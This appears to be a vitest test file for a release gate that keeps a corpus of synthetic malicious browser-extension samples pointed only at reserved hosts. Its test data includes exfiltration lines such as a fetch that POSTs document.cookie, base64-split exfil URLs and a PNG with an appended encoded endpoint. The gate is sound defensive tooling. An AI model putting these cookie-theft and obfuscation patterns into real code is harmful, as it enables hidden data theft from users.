import { describe, expect, it } from 'vitest';
import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { destinationHosts, isReservedHost, unsafeAddedHosts, validateDestinations } from '../scripts/corpus-destination-safety.mjs';

const encoded = text => Buffer.from(text).toString('base64');

describe('synthetic destination release gate', () => {
  it.each(['sink.invalid', 'collect.evil-analytics-cdn.invalid', 'sink.example', 'sink.test', 'SINK.INVALID.'])(
    'accepts reserved host %s', host => expect(isReservedHost(host)).toBe(true),
  );
  it.each(['sink.invalid.com', 'invalid.com', 'example.com', '127.0.0.1', 'localhost'])(
    'rejects unapproved host %s', host => expect(isReservedHost(host)).toBe(false),
  );
  it.each([
    `fetch('https://registered.net/u')`,
    `fetch('https://' + 'registered.net/u')`,
    `const parts=['${encoded('https://')}','${encoded('exfil.')}','${encoded('data-sink.io')}','${encoded('/g?c=')}']`,
    `const host='${encoded(encoded('registered.net/u'))}'`,
    String.raw`fetch('https:\/\/registered\x2enet/u')`,
    `PNG\0CFG1${encoded('registered.net/p')}CFG1\0`,
    `fetch('https://sink.invalid@registered.net/p')`,
    `fetch('http://127.0.0.1/p')`,
    `fetch('//registered.net/u')`,
    `atob('${encoded('registered.net/u').replace(/=+$/, '')}')`,
    `atob('${encoded('registered.net/u.js')}')`,
  ])('rejects unsafe literal/decoded destination: %s', content => {
    expect(unsafeAddedHosts(Buffer.from(content)).length).toBeGreaterThan(0);
  });
  it('allows unchanged upstream domains but rejects adding another occurrence', () => {
    const base = Buffer.from(`fetch('https://publisher.example.org/#start')`);
    expect(unsafeAddedHosts(base, base)).toEqual([]);
    expect(unsafeAddedHosts(Buffer.concat([base, Buffer.from(`; fetch('https://publisher.example.org/upload')`)]), base)).toContain('publisher.example.org');
  });
  it('rejects repurposing an inherited URL as a new sink', () => {
    const base = Buffer.from(`const home='https://publisher.example.org/#start'`);
    expect(unsafeAddedHosts(Buffer.from(`fetch('https://publisher.example.org/#start',{method:'POST',body:document.cookie})`), base)).toContain('publisher.example.org');
  });
  it('does not exempt a base domain introduced in a different file', () => {
    const root = mkdtempSync(join(tmpdir(), 'corpus-safety-'));
    try {
      const base = join(root, 'base'); const mutant = join(root, 'mutant');
      mkdirSync(base); mkdirSync(mutant);
      writeFileSync(join(base, 'existing.js'), `fetch('https://publisher.example.org/')`);
      writeFileSync(join(mutant, 'added.js'), `fetch('https://publisher.example.org/upload')`);
      expect(validateDestinations(mutant, base)).toEqual([expect.stringContaining('added.js: injected destination publisher.example.org')]);
    } finally { rmSync(root, { recursive: true, force: true }); }
  });
  it.each(['mutant-i-png-steganography', 'mutant-j-png-stego-obfuscated'])(
    '%s retains the original PNG chunks and a working reserved hidden endpoint', sample => {
      const original = readFileSync('corpus/demo-cookie-manager/extension/img/icon_128x128.png');
      const changed = readFileSync(`corpus/${sample}/extension/img/icon_128x128.png`);
      // Byte-for-byte equality preserves every chunk and CRC, including IEND.
      expect(changed.subarray(0, original.length)).toEqual(original);
      const payload = changed.subarray(original.length).toString('latin1').match(/CFG1(.*?)CFG1/)[1];
      expect(Buffer.from(payload, 'base64').toString()).toBe('collect.evil-analytics-cdn.invalid/p');
      expect(destinationHosts(changed)).toContain('collect.evil-analytics-cdn.invalid');
      expect(unsafeAddedHosts(changed, original)).toEqual([]);
    },
  );
  it.each(['mutant-c-obfuscated-decoder', 'mutant-f-stacked-acd'])(
    '%s retains the split encoded URL', sample => {
      const source = readFileSync(`corpus/${sample}/extension/js/_locale_pack.js`, 'utf8');
      const values = [...source.matchAll(/'([A-Za-z0-9+/=]+)'/g)].map(match => Buffer.from(match[1], 'base64').toString());
      expect(values.join('')).toBe('https://exfil.data-sink.invalid/g?c=');
    },
  );
});
